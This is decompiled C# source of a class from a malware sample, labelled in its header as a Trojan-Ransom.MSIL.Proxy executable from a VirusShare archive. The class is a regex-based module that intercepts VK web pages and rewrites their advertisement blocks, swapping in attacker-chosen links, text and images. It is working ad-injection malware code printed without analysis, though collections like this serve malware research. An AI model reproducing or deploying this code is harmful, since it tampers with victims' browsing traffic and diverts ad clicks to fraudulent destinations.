// Decompiled with JetBrains decompiler
// Type: ProxyService.VkChanger
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2C16A6BC-A494-400A-8424-EAA16AF18A07
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Proxy.i-6ae0f1a22a3853772c471bd1cff09fbc61c0ad51402c76f031cdbb65043ed6d0.exe

using System.Text.RegularExpressions;

namespace ProxyService
{
  internal class VkChanger
  {
    private readonly XmlHelper.VkAdBlock _ad;

    public VkChanger(XmlHelper.VkAdBlock adBlock) => this._ad = adBlock;

    public string Change(string code) => new Regex("return leftAdBlockHide\\('_ad_[\\d]', '\\\\(?<direct>[\\w\\W]*?)'\\);[\\w\\W]*?<div id=\\\\.ad_title\\\\.[\\s\\n]*class=\\\\.ad_title_new\\\\.>(?<bigText>[\\w\\W]*?)<\\\\/[\\w\\W]*?<div class=\\\\.ad_domain_new\\\\.>(?<smallText>[\\w\\W]*?)<\\\\/div>[\\w\\W]*?<img src=\\\\.(?<imgLink>[\\w\\W]*?)\\\\. [\\w\\W]*?<div[^><]*?class=\\\\.((ad_info_new)|(ad_desc_new))\\\\.[^><]*?>(?<downText>[\\w\\W]*?)<\\\\/div>[\\w\\W]*?<a href=\\\\.\\\\(?<link>[\\w\\W]*?)\\\\.").Replace(code, new MatchEvaluator(this.UpdateAd));

    public string UpdateAd(Match match) => match.Value.Replace(match.Groups["direct"].Value, this._ad.Link).Replace(match.Groups["bigText"].Value, this._ad.BigText).Replace(match.Groups["smallText"].Value, this._ad.SmallText).Replace(match.Groups["imgLink"].Value, this._ad.ImageLink).Replace(match.Groups["downText"].Value, this._ad.DownText).Replace(match.Groups["link"].Value, this._ad.Link);
  }
}
